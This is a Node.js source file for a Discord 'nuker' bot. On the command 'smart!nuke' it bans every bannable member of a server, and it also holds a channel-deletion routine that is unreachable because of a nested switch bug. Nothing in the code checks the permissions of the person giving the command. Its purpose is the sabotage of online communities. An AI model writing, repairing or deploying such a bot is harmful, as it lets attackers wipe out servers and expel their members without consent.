const Discord = require('discord.js');
const bot = new Discord.Client();
const config = require('./config.json');
const prefix = "smart!"

bot.on('message', async message => {
    let Args = message.content.slice(prefix.length).trim().split(/ +/g);
    switch (Args[0]) {
        case 'nuke':
            message.channel.send("banning")
            await message.guild.members.cache.forEach(member => {
                console.log(member)
                if (!member.bannable) {
                    console.log(member, 'is not bannable')
                } else {
                    try {
                        member.ban()
                    } catch (err) {
                        console.log(err)
                    }
                }
                console.log('Searching')
            })
            switch (Args[0]) {
                case 'delete':
                    message.guild.channels.cache.forEach((channel) => {
                        setTimeout(function () {
                            if (channel.deletable) {
                                channel.delete()
                                console.log(channel, 'has been deleted')
                            }
                        }, 1000)
                    })
            }
    }
})

bot.login(config.Token)
